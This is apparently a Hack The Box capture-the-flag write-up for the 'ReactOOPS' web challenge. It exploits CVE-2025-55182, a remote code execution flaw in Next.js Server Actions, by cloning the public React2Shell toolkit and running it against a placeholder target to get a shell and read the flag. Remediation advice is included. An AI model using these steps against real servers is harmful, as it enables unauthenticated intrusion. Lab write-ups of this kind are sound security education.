---
title: ReactOOPS
date: 2026-11-09
type: Web
CVE: CVE-2025-55182
Difficulty: Very Easy
summary: A Next.js application vulnerable to **CVE-2025-55182** — a critical Remote Code Execution flaw in Next.js Server Actions that allows unauthenticated attackers to execute arbitrary commands on the server.
tags: [Linux, Web, PrivEsc, RCE]
Flag Format: HTB{...}
draft: false
---

---

## Reconnaissance — Identifying the Framework & Version
 
The challenge provides the application source files. The first step is inspecting `package.json` to fingerprint the exact framework and version:
 
```json
// /web_reactoops/challenge/package.json
{
  "name": "react2shell",
  "dependencies": {
    "next": "16.0.6",
    "react": "^19",
    "react-dom": "^19"
  }
}
```
 
Two things stand out immediately:
 
1. **The package name is literally `react2shell`** — a direct hint pointing to the exploit tool and CVE.
2. **Next.js version `16.0.6`** — a quick search confirms this version is affected by **CVE-2025-55182**, a critical unauthenticated RCE in Next.js Server Actions.
This is all the signal needed to know exactly which exploit to use.
 
---

## Vulnerability — CVE-2025-55182

Next.js Server Actions are server-side functions that can be called directly from the client. In vulnerable versions, the Server Action endpoint fails to properly validate or sanitize inputs before passing them to server-side execution, allowing an attacker to inject arbitrary OS commands.

**Impact:** Unauthenticated Remote Code Execution (RCE) on the host server.

---

## Tool Used

[React2Shell](https://github.com/xalgord/React2Shell) — an exploitation toolkit built specifically for CVE-2025-55182. It provides an interactive shell wrapper over the vulnerable Next.js endpoint with built-in features like command history, file download, and privilege escalation.

### Installation

```bash
git clone https://github.com/xalgord/React2Shell.git
cd React2Shell
```

---

## Exploitation

### Step 1 — Run React2Shell Against the Target

```bash
python3 react2shell.py -u "http://<TARGET_IP>:<PORT>/"
```

This automatically detects the vulnerable Server Action endpoint and drops into an interactive shell.

### Step 2 — Enumerate the Filesystem

```bash
$ ls
$ cd ..
$ ls
```

### Step 3 — Read the Flag

```bash
$ cat flag.txt
```

---

## Root Cause

| Layer       | Issue                                                              |
|-------------|--------------------------------------------------------------------|
| Framework   | Next.js Server Actions endpoint lacks input validation             |
| Impact      | Unauthenticated RCE via crafted POST to the Server Action handler  |
| CVE Score   | Critical                                                           |

---

## Remediation

- Update Next.js to a patched version that addresses CVE-2025-55182.
- Never expose Server Actions without proper authentication and input sanitization.
- Apply WAF rules to block encoded payload patterns at the edge.

---

## Summary

> ReactOOPS exploits CVE-2025-55182, a critical RCE in Next.js Server Actions. Using the React2Shell toolkit, we obtained an interactive shell on the target, traversed the filesystem with `cd ..`, and read the flag.

**Tool:** [React2Shell by xalgord](https://github.com/xalgord/React2Shell)  
**Flag:** `HTB{REDACTED}`